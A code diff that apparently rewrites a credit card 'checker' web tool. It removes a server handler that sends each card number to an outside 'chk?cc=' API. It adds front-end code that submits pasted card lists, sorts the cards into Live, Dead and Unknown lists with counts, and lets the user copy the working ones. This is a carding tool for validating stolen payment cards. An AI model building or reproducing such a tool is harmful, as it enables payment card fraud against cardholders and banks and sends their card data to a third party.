@@ -1,47 +1,150 @@
-export default async function handler(req, res) {
-  // 1️⃣ Allow only POST requests
-  if (req.method !== 'POST') {
-    res.status(405).json({ error: 'Only POST allowed' });
-    return;
-  }
+let stopChecking = false;
 
-  const { cards } = req.body;
+document.addEventListener('DOMContentLoaded', () => {
+    const checkBtn = document.getElementById("check-btn");
+    const stopCheckBtn = document.getElementById("stop-check-btn");
+    const numbersTextarea = document.getElementById("numbers");
+    const resultOutputTextarea = document.getElementById("result-output");
 
-  // 2️⃣ Validate cards input
-  if (!cards || !Array.isArray(cards)) {
-    res.status(400).json({ error: 'Invalid input: cards array is required.' });
-    return;
-  }
+    const liveNumbersTextarea = document.getElementById("ali-numbers");
+    const deadNumbersTextarea = document.getElementById("muhammad-numbers");
+    const unknownNumbersTextarea = document.getElementById("murad-numbers");
 
-  // 3️⃣ Setup Server-Sent Events (SSE) headers
-  res.setHeader('Content-Type', 'text/event-stream');
-  res.setHeader('Cache-Control', 'no-cache');
-  res.setHeader('Connection', 'keep-alive');
-  res.flushHeaders(); // Important for Vercel streaming
+    const liveCountSpan = document.getElementById("ali-count");
+    const deadCountSpan = document.getElementById("muhammad-count");
+    const unknownCountSpan = document.getElementById("murad-count");
 
-  // 4️⃣ Process cards one by one
-  for (let i = 0; i < cards.length; i++) {
-    const card = cards[i].trim();
-    if (!card) continue;
+    let liveCount = 0;
+    let deadCount = 0;
+    let unknownCount = 0;
 
-    let result = { card, status: 'Unknown' };
+    checkBtn.addEventListener("click", toggleChecking);
+    stopCheckBtn.addEventListener("click", stopCheckingProcess);
 
-    try {
-      const apiURL = `https://drlabapis.onrender.com/api/chk?cc=${encodeURIComponent(card)}`;
-      const apiRes = await fetch(apiURL);
-      const data = await apiRes.json();
-
-      result.status = data.response || 'Unknown';
-    } catch (err) {
-      result.error = err.message || 'Error';
+    function toggleChecking() {
+        checkBtn.disabled = true;
+        stopCheckBtn.disabled = false;
+        startChecking();
     }
 
-    // 5️⃣ Send the individual result
-    res.write(`data: ${JSON.stringify(result)}\n\n`);
-    await new Promise(resolve => setTimeout(resolve, 500));
-  }
+    function stopCheckingProcess() {
+        stopChecking = true;
+        checkBtn.disabled = false;
+        stopCheckBtn.disabled = true;
+        Swal.fire("Checking Stopped", "Credit card checking has been stopped.", "info");
+    }
 
-  // 6️⃣ Mark stream done
-  res.write(`event: done\ndata: complete\n\n`);
-  res.end();
-}
+    async function startChecking() {
+        stopChecking = false;
+
+        const input = numbersTextarea.value.trim();
+        const cards = input.split("\n").filter(line => line.trim() !== "");
+
+        resultOutputTextarea.value = "";
+        liveNumbersTextarea.value = "";
+        deadNumbersTextarea.value = "";
+        unknownNumbersTextarea.value = "";
+        updateSummaryCounts(0, 0, 0);
+
+        if (cards.length === 0) {
+            Swal.fire("No Cards", "Please enter credit card numbers to check.", "info");
+            checkBtn.disabled = false;
+            stopCheckBtn.disabled = true;
+            return;
+        }
+
+        appendToStatusOutput(`⏳ Starting check of ${cards.length} cards...\n`);
+
+        const response = await fetch('/api/check', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ cards })
+        });
+
+        const reader = response.body.getReader();
+        const decoder = new TextDecoder('utf-8');
+        let buffer = '';
+
+        while (!stopChecking) {
+            const { value, done } = await reader.read();
+            if (done) break;
+
+            buffer += decoder.decode(value, { stream: true });
+            const lines = buffer.split('\n\n');
+
+            buffer = lines.pop(); // Keep unfinished line
+
+            for (const chunk of lines) {
+                if (chunk.startsWith('event: done')) {
+                    appendToStatusOutput(
+                        `\n✅ Checking Finished!\n` +
+                        `Total: ${cards.length}\n🟢 Live: ${liveCount}\n🔴 Dead: ${deadCount}\n🟡 Unknown: ${unknownCount}`
+                    );
+                    checkBtn.disabled = false;
+                    stopCheckBtn.disabled = true;
+                    Swal.fire("Done", "All cards checked.", "success");
+                    return;
+                }
+
+                if (chunk.startsWith('data:')) {
+                    const raw = chunk.replace(/^data:\s*/, '');
+                    const result = JSON.parse(raw);
+                    const card = result.card;
+                    const status = result.status;
+
+                    let displayText = '';
+                    if (status === 'Live') {
+                        liveCount++;
+                        appendResultToSpecificOutput(liveNumbersTextarea, card);
+                        displayText = '🟢 Live';
+                    } else if (status === 'Dead') {
+                        deadCount++;
+                        appendResultToSpecificOutput(deadNumbersTextarea, card);
+                        displayText = '🔴 Dead';
+                    } else {
+                        unknownCount++;
+                        appendResultToSpecificOutput(unknownNumbersTextarea, card);
+                        displayText = '🟡 Unknown';
+                    }
+
+                    appendToStatusOutput(`➡️ ${card} ${displayText}`);
+                    updateSummaryCounts(liveCount, deadCount, unknownCount);
+                }
+            }
+        }
+
+        appendToStatusOutput(`🛑 Checking stopped by user.`);
+        checkBtn.disabled = false;
+        stopCheckBtn.disabled = true;
+    }
+
+    function appendToStatusOutput(text) {
+        resultOutputTextarea.value += text + '\n';
+        resultOutputTextarea.scrollTop = resultOutputTextarea.scrollHeight;
+    }
+
+    function appendResultToSpecificOutput(textareaElement, text) {
+        textareaElement.value += text + '\n';
+        textareaElement.scrollTop = textareaElement.scrollHeight;
+    }
+
+    function updateSummaryCounts(live, dead, unknown) {
+        liveCountSpan.textContent = live;
+        deadCountSpan.textContent = dead;
+        unknownCountSpan.textContent = unknown;
+    }
+
+    window.copyToClipboard = function (elementId) {
+        const textareaElement = document.getElementById(elementId);
+        if (textareaElement && textareaElement.value) {
+            navigator.clipboard.writeText(textareaElement.value).then(() => {
+                Swal.fire("Copied!", "Content copied to clipboard.", "success");
+            }).catch(err => {
+                console.error('Failed to copy text: ', err);
+                Swal.fire("Error", "Could not copy text.", "error");
+            });
+        } else {
+            Swal.fire("No Content", "The section is empty.", "info");
+        }
+    }
+});
